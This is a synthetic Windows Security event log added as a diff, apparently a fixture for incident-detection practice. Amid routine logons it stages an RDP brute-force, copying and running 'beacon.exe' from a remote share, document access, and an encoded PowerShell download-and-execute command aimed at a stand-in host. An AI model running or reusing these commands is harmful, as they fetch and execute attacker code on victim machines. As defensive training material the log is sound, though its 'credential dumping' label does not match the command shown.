@@ -1,0 +1,676 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Events>
+  <!-- Normal morning logon activity -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4624</EventID>
+      <Version>2</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-14T22:03:17.284Z"/>
+      <EventRecordID>104821</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-18</Data>
+      <Data Name="SubjectUserName">WORKSTATION01$</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="TargetUserSid">S-1-5-21-3623811015-3361044348-30300820-1105</Data>
+      <Data Name="TargetUserName">svcaccount</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="LogonType">5</Data>
+      <Data Name="LogonProcessName">Advapi</Data>
+      <Data Name="AuthenticationPackageName">Negotiate</Data>
+      <Data Name="WorkstationName">WORKSTATION01</Data>
+      <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="IpAddress">-</Data>
+      <Data Name="IpPort">-</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4624</EventID>
+      <Version>2</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-14T23:45:02.119Z"/>
+      <EventRecordID>104834</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-18</Data>
+      <Data Name="SubjectUserName">WORKSTATION01$</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="TargetUserSid">S-1-5-21-3623811015-3361044348-30300820-500</Data>
+      <Data Name="TargetUserName">admin</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="LogonProcessName">NtLmSsp</Data>
+      <Data Name="AuthenticationPackageName">NTLM</Data>
+      <Data Name="WorkstationName">WORKSTATION01</Data>
+      <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="IpAddress">10.0.1.10</Data>
+      <Data Name="IpPort">49832</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4672</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>12548</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-14T23:45:02.119Z"/>
+      <EventRecordID>104835</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-3623811015-3361044348-30300820-500</Data>
+      <Data Name="SubjectUserName">admin</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="PrivilegeList">SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege SeSystemEnvironmentPrivilege SeLoadDriverPrivilege SeImpersonatePrivilege SeDelegateSessionUserImpersonatePrivilege SeEnableDelegationPrivilege</Data>
+    </EventData>
+  </Event>
+
+  <!-- Scheduled task service logon noise -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4624</EventID>
+      <Version>2</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T00:00:01.503Z"/>
+      <EventRecordID>104840</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-18</Data>
+      <Data Name="SubjectUserName">WORKSTATION01$</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="TargetUserSid">S-1-5-18</Data>
+      <Data Name="TargetUserName">SYSTEM</Data>
+      <Data Name="TargetDomainName">NT AUTHORITY</Data>
+      <Data Name="LogonType">5</Data>
+      <Data Name="LogonProcessName">Advapi</Data>
+      <Data Name="AuthenticationPackageName">Negotiate</Data>
+      <Data Name="WorkstationName">WORKSTATION01</Data>
+      <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="IpAddress">-</Data>
+      <Data Name="IpPort">-</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4624</EventID>
+      <Version>2</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T01:00:01.221Z"/>
+      <EventRecordID>104845</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-18</Data>
+      <Data Name="SubjectUserName">WORKSTATION01$</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="TargetUserSid">S-1-5-21-3623811015-3361044348-30300820-1105</Data>
+      <Data Name="TargetUserName">svcaccount</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="LogonType">5</Data>
+      <Data Name="LogonProcessName">Advapi</Data>
+      <Data Name="AuthenticationPackageName">Negotiate</Data>
+      <Data Name="WorkstationName">WORKSTATION01</Data>
+      <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="IpAddress">-</Data>
+      <Data Name="IpPort">-</Data>
+    </EventData>
+  </Event>
+
+  <!-- ATTACK BEGINS: Failed RDP logon attempts from external IP -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4625</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8010000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:15:33.847Z"/>
+      <EventRecordID>104851</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-0-0</Data>
+      <Data Name="SubjectUserName">-</Data>
+      <Data Name="SubjectDomainName">-</Data>
+      <Data Name="TargetUserSid">S-1-0-0</Data>
+      <Data Name="TargetUserName">jsmith</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="Status">0xC000006D</Data>
+      <Data Name="FailureReason">%%2313</Data>
+      <Data Name="SubStatus">0xC000006A</Data>
+      <Data Name="LogonType">10</Data>
+      <Data Name="LogonProcessName">User32</Data>
+      <Data Name="AuthenticationPackageName">Negotiate</Data>
+      <Data Name="WorkstationName">WORKSTATION01</Data>
+      <Data Name="IpAddress">203.0.113.50</Data>
+      <Data Name="IpPort">51832</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4625</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8010000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:16:12.503Z"/>
+      <EventRecordID>104852</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-0-0</Data>
+      <Data Name="SubjectUserName">-</Data>
+      <Data Name="SubjectDomainName">-</Data>
+      <Data Name="TargetUserSid">S-1-0-0</Data>
+      <Data Name="TargetUserName">jsmith</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="Status">0xC000006D</Data>
+      <Data Name="FailureReason">%%2313</Data>
+      <Data Name="SubStatus">0xC000006A</Data>
+      <Data Name="LogonType">10</Data>
+      <Data Name="LogonProcessName">User32</Data>
+      <Data Name="AuthenticationPackageName">Negotiate</Data>
+      <Data Name="WorkstationName">WORKSTATION01</Data>
+      <Data Name="IpAddress">203.0.113.50</Data>
+      <Data Name="IpPort">51847</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4625</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8010000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:17:45.291Z"/>
+      <EventRecordID>104853</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-0-0</Data>
+      <Data Name="SubjectUserName">-</Data>
+      <Data Name="SubjectDomainName">-</Data>
+      <Data Name="TargetUserSid">S-1-0-0</Data>
+      <Data Name="TargetUserName">jsmith</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="Status">0xC000006D</Data>
+      <Data Name="FailureReason">%%2313</Data>
+      <Data Name="SubStatus">0xC000006A</Data>
+      <Data Name="LogonType">10</Data>
+      <Data Name="LogonProcessName">User32</Data>
+      <Data Name="AuthenticationPackageName">Negotiate</Data>
+      <Data Name="WorkstationName">WORKSTATION01</Data>
+      <Data Name="IpAddress">203.0.113.50</Data>
+      <Data Name="IpPort">51863</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4625</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8010000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:18:09.672Z"/>
+      <EventRecordID>104854</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-0-0</Data>
+      <Data Name="SubjectUserName">-</Data>
+      <Data Name="SubjectDomainName">-</Data>
+      <Data Name="TargetUserSid">S-1-0-0</Data>
+      <Data Name="TargetUserName">jsmith</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="Status">0xC000006D</Data>
+      <Data Name="FailureReason">%%2313</Data>
+      <Data Name="SubStatus">0xC000006A</Data>
+      <Data Name="LogonType">10</Data>
+      <Data Name="LogonProcessName">User32</Data>
+      <Data Name="AuthenticationPackageName">Negotiate</Data>
+      <Data Name="WorkstationName">WORKSTATION01</Data>
+      <Data Name="IpAddress">203.0.113.50</Data>
+      <Data Name="IpPort">51879</Data>
+    </EventData>
+  </Event>
+
+  <!-- Successful RDP logon from attacker -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4624</EventID>
+      <Version>2</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:19:41.338Z"/>
+      <EventRecordID>104855</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-0-0</Data>
+      <Data Name="SubjectUserName">-</Data>
+      <Data Name="SubjectDomainName">-</Data>
+      <Data Name="TargetUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="TargetUserName">jsmith</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="LogonType">10</Data>
+      <Data Name="LogonProcessName">User32</Data>
+      <Data Name="AuthenticationPackageName">Negotiate</Data>
+      <Data Name="WorkstationName">WORKSTATION01</Data>
+      <Data Name="LogonGuid">{F4DC5B01-3E7A-9C28-1D4E-6F8A2B3C4D5E}</Data>
+      <Data Name="IpAddress">203.0.113.50</Data>
+      <Data Name="IpPort">51902</Data>
+      <Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data>
+    </EventData>
+  </Event>
+
+  <!-- Special privileges assigned to attacker session -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4672</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>12548</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:19:41.338Z"/>
+      <EventRecordID>104856</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="SubjectUserName">jsmith</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="PrivilegeList">SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege SeSystemEnvironmentPrivilege SeLoadDriverPrivilege SeImpersonatePrivilege SeDelegateSessionUserImpersonatePrivilege SeEnableDelegationPrivilege</Data>
+    </EventData>
+  </Event>
+
+  <!-- Process creation - attacker drops beacon -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4688</EventID>
+      <Version>2</Version>
+      <Level>0</Level>
+      <Task>13312</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:20:18.774Z"/>
+      <EventRecordID>104858</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="SubjectUserName">jsmith</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="NewProcessId">0x1a2c</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ProcessId">0x0f84</Data>
+      <Data Name="CommandLine">cmd.exe /c "copy \\203.0.113.50\share\beacon.exe C:\Users\jsmith\AppData\Local\Temp\beacon.exe"</Data>
+      <Data Name="TargetUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="TargetUserName">jsmith</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="ParentProcessName">C:\Windows\explorer.exe</Data>
+    </EventData>
+  </Event>
+
+  <!-- Beacon execution -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4688</EventID>
+      <Version>2</Version>
+      <Level>0</Level>
+      <Task>13312</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:21:05.442Z"/>
+      <EventRecordID>104860</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="SubjectUserName">jsmith</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="NewProcessId">0x1b48</Data>
+      <Data Name="NewProcessName">C:\Users\jsmith\AppData\Local\Temp\beacon.exe</Data>
+      <Data Name="ProcessId">0x1a2c</Data>
+      <Data Name="CommandLine">beacon.exe</Data>
+      <Data Name="TargetUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="TargetUserName">jsmith</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
+    </EventData>
+  </Event>
+
+  <!-- PowerShell execution for credential dumping -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4688</EventID>
+      <Version>2</Version>
+      <Level>0</Level>
+      <Task>13312</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:30:22.118Z"/>
+      <EventRecordID>104867</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="SubjectUserName">jsmith</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="NewProcessId">0x1d90</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ProcessId">0x1b48</Data>
+      <Data Name="CommandLine">powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBwAGEAeQBsAG8AYQBkACcAKQA=</Data>
+      <Data Name="TargetUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="TargetUserName">jsmith</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="ParentProcessName">C:\Users\jsmith\AppData\Local\Temp\beacon.exe</Data>
+    </EventData>
+  </Event>
+
+  <!-- Service account noise -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4624</EventID>
+      <Version>2</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:30:01.887Z"/>
+      <EventRecordID>104865</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-18</Data>
+      <Data Name="SubjectUserName">WORKSTATION01$</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="TargetUserSid">S-1-5-21-3623811015-3361044348-30300820-1105</Data>
+      <Data Name="TargetUserName">svcaccount</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="LogonType">5</Data>
+      <Data Name="LogonProcessName">Advapi</Data>
+      <Data Name="AuthenticationPackageName">Negotiate</Data>
+      <Data Name="WorkstationName">WORKSTATION01</Data>
+      <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="IpAddress">-</Data>
+      <Data Name="IpPort">-</Data>
+    </EventData>
+  </Event>
+
+  <!-- Lateral movement - second logon from internal IP -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4624</EventID>
+      <Version>2</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:45:17.992Z"/>
+      <EventRecordID>104873</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-0-0</Data>
+      <Data Name="SubjectUserName">-</Data>
+      <Data Name="SubjectDomainName">-</Data>
+      <Data Name="TargetUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="TargetUserName">jsmith</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="LogonProcessName">NtLmSsp</Data>
+      <Data Name="AuthenticationPackageName">NTLM</Data>
+      <Data Name="WorkstationName">FILESERVER02</Data>
+      <Data Name="LogonGuid">{A2B3C4D5-6E7F-8091-A2B3-C4D5E6F70819}</Data>
+      <Data Name="IpAddress">10.0.1.50</Data>
+      <Data Name="IpPort">52104</Data>
+      <Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data>
+    </EventData>
+  </Event>
+
+  <!-- Privilege assignment for lateral movement session -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4672</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>12548</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:45:17.992Z"/>
+      <EventRecordID>104874</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="SubjectUserName">jsmith</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="PrivilegeList">SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege SeSystemEnvironmentPrivilege SeLoadDriverPrivilege SeImpersonatePrivilege SeDelegateSessionUserImpersonatePrivilege SeEnableDelegationPrivilege</Data>
+    </EventData>
+  </Event>
+
+  <!-- File access - exfiltration of documents -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4663</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>12800</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:50:33.441Z"/>
+      <EventRecordID>104880</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="SubjectUserName">jsmith</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="ObjectName">C:\Users\jsmith\Documents\Q1-Financial-Report.docx</Data>
+      <Data Name="ObjectType">File</Data>
+      <Data Name="HandleId">0x4c8</Data>
+      <Data Name="AccessMask">0x1</Data>
+      <Data Name="ProcessName">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ProcessId">0x1e44</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4663</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>12800</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:50:48.207Z"/>
+      <EventRecordID>104881</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="SubjectUserName">jsmith</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="ObjectName">C:\Users\jsmith\Documents\employee-roster-2025.xlsx</Data>
+      <Data Name="ObjectType">File</Data>
+      <Data Name="HandleId">0x4d0</Data>
+      <Data Name="AccessMask">0x1</Data>
+      <Data Name="ProcessName">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ProcessId">0x1e44</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4663</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>12800</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T02:51:02.893Z"/>
+      <EventRecordID>104882</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="SubjectUserName">jsmith</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="ObjectName">C:\Users\jsmith\Documents\network-diagram.pdf</Data>
+      <Data Name="ObjectType">File</Data>
+      <Data Name="HandleId">0x4d8</Data>
+      <Data Name="AccessMask">0x1</Data>
+      <Data Name="ProcessName">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ProcessId">0x1e44</Data>
+    </EventData>
+  </Event>
+
+  <!-- Logoff event after exfiltration -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4634</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>12545</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T03:15:44.102Z"/>
+      <EventRecordID>104891</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="TargetUserSid">S-1-5-21-3623811015-3361044348-30300820-1122</Data>
+      <Data Name="TargetUserName">jsmith</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="LogonType">10</Data>
+    </EventData>
+  </Event>
+
+  <!-- Normal morning activity resuming -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+      <EventID>4624</EventID>
+      <Version>2</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2025-03-15T06:30:12.554Z"/>
+      <EventRecordID>104902</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WORKSTATION01.corp.local</Computer>
+      <Security/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-18</Data>
+      <Data Name="SubjectUserName">WORKSTATION01$</Data>
+      <Data Name="SubjectDomainName">CORP</Data>
+      <Data Name="TargetUserSid">S-1-5-21-3623811015-3361044348-30300820-500</Data>
+      <Data Name="TargetUserName">admin</Data>
+      <Data Name="TargetDomainName">CORP</Data>
+      <Data Name="LogonType">2</Data>
+      <Data Name="LogonProcessName">User32</Data>
+      <Data Name="AuthenticationPackageName">Negotiate</Data>
+      <Data Name="WorkstationName">WORKSTATION01</Data>
+      <Data Name="LogonGuid">{B1C2D3E4-5F6A-7B8C-9D0E-1F2A3B4C5D6E}</Data>
+      <Data Name="IpAddress">127.0.0.1</Data>
+      <Data Name="IpPort">0</Data>
+    </EventData>
+  </Event>
+</Events>
